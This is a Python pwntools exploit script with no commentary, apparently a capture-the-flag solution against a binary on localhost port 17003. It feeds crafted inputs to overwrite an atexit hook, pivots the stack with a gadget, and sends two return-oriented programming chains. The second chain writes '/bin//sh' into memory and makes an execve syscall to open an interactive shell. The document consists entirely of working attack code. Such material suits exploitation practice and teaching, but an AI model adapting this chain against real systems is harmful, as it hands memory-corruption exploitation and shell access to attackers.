#!/usr/bin/env python3
from pwn import *

# SETTINGS

def chain1():
    p  = p64(0x40f91e) # : pop rsi ; ret
    p += p64(0x4E0480) # bss
    p += p64(0x4ab4ea)
    p += p64(0x00000000004018ea)# : pop rdi ; ret) # pop rdi
    p += p64(0x0)
    p += p64(0x45A070) # syscall
    p += p64(0x0000000000403470)# : pop rsp ; ret)
    p += p64(0x4e0480)
    return p

def chain2():
    p = b''
    p += p64(0x40f91e) # pop rsi ; ret
    p += p64(0x4de0e0) # @ .data
    p += p64(0x45ab07) # pop rax ; ret
    p += b'/bin//sh'
    p += p64(0x49f8b5) # mov qword ptr [rsi], rax ; ret
    p += p64(0x40f91e) # pop rsi ; ret
    p += p64(0x4de0e8) # @ .data + 8
    p += p64(0x44f6f9) # xor rax, rax ; ret
    p += p64(0x49f8b5) # mov qword ptr [rsi], rax ; ret
    p += p64(0x4018ea) # pop rdi ; ret
    p += p64(0x4de0e0) # @ .data
    p += p64(0x40f91e) # pop rsi ; ret
    p += p64(0x4de0e8) # @ .data + 8
    p += p64(0x4017ef) # pop rdx ; ret
    p += p64(0x4de0e8) # @ .data + 8
    p += p64(0x45ab07) # pop rax ; ret)
    p += p64(0x3b)
    p += p64(0x4012e3) # syscall
    return p

IP = "localhost"
PORT = 17003

r = remote(IP, PORT)
at_exit_hook = 0x4E0468

# SPLOIT #
for i in range(5):
    r.sendlineafter(b"x: ", b'1024')
    r.sendlineafter(b"y: ", b'2048')
    
r.sendlineafter(b"x: ", str(at_exit_hook).encode()) # libc_atexit_hook
r.sendlineafter(b"y: ", b'1337') 
r.sendlineafter(b": ", b'4198832') # magic gadget to pivot stack to our heap-chunk
r.sendafter(b": ", chain1())
r.send(chain2())

r.interactive()
